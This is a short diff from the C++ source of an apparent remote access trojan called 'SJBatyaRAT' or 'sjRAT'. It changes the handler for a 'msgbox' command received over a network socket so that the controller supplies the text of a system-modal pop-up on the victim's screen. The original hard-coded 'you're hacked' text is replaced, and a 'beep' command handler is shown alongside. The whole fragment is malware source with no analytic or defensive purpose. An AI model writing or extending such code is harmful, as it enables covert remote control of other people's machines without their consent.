@@ -196,11 +196,12 @@ int main(int argc, char* argv[])
         {
             buff[bytesReceived] = '\0';
             std::string command(buff);
-            if (command == "msgbox") {
+            if (command.substr(0, 6) == "msgbox") {
+                std::string MsgBox_text = command.substr(7);
                 std::string callback = "Message box was summoned!";
                 send(s, callback.c_str(), callback.size(), 0);
 
-                MessageBox(NULL, "U're hacked by SJBatyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+                MessageBox(NULL, MsgBox_text.c_str(), "sjRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
             }
             else if (command.substr(0, 4) == "beep") {
                 std::string durStr = command.substr(5);
